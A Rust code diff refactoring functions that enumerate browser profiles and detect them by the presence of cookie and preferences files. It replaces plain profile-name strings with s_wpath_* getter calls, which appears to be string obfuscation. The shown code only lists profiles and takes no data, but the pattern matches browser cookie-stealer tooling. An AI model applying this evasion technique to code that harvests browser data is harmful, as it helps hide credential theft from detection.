@@ -487,9 +487,10 @@ pub fn profiles_from_local_state(user_data_path: &Path) -> Vec<(String, PathBuf)
 
     let mut profiles = Vec::new();
     let info_cache = s_profile_info_cache();
+    let sys_prof = s_wpath_system_profile();
     if let Some(cache) = json.pointer(&info_cache).and_then(|v| v.as_object()) {
         for name in cache.keys() {
-            if name == "System Profile" {
+            if name == &sys_prof {
                 continue;
             }
             let path = user_data_path.join(name);
@@ -506,13 +507,16 @@ pub fn profiles_from_local_state(user_data_path: &Path) -> Vec<(String, PathBuf)
 }
 
 fn profile_sort_key(name: &str) -> (u8, u32, String) {
-    if name == "Default" {
+    let dflt = s_wpath_default();
+    let guest = s_wpath_guest_profile();
+    let prefix = s_wpath_profile_prefix();
+    if name == dflt {
         return (0, 0, String::new());
     }
-    if name == "Guest Profile" {
+    if name == guest {
         return (2, 0, String::new());
     }
-    if let Some(n) = name.strip_prefix("Profile ") {
+    if let Some(n) = name.strip_prefix(prefix.as_str()) {
         if let Ok(num) = n.parse::<u32>() {
             return (1, num, String::new());
         }
@@ -523,7 +527,7 @@ fn profile_sort_key(name: &str) -> (u8, u32, String) {
 pub fn get_profiles(user_data_path: &Path, has_profiles: bool) -> Vec<(String, PathBuf)> {
     if !has_profiles {
         if user_data_path.exists() {
-            return vec![("Default".to_string(), user_data_path.to_path_buf())];
+            return vec![(s_wpath_default(), user_data_path.to_path_buf())];
         }
         return Vec::new();
     }
@@ -537,12 +541,16 @@ pub fn get_profiles(user_data_path: &Path, has_profiles: bool) -> Vec<(String, P
                 continue;
             }
             let name = entry.file_name().to_string_lossy().to_string();
-            if name == "System Profile" || name.starts_with('.') {
+            let sys_prof2 = s_wpath_system_profile();
+            let dflt2 = s_wpath_default();
+            let guest2 = s_wpath_guest_profile();
+            let prefix2 = s_wpath_profile_prefix();
+            if name == sys_prof2 || name.starts_with('.') {
                 continue;
             }
-            let is_profile = name == "Default"
-                || name == "Guest Profile"
-                || name.starts_with("Profile ")
+            let is_profile = name == dflt2
+                || name == guest2
+                || name.starts_with(prefix2.as_str())
                 || entry.path().join(s_file_preferences()).exists()
                 || entry.path().join(&s_dir_network()).join(&s_file_cookies_db()).exists()
                 || entry.path().join(&s_file_cookies_db()).exists();
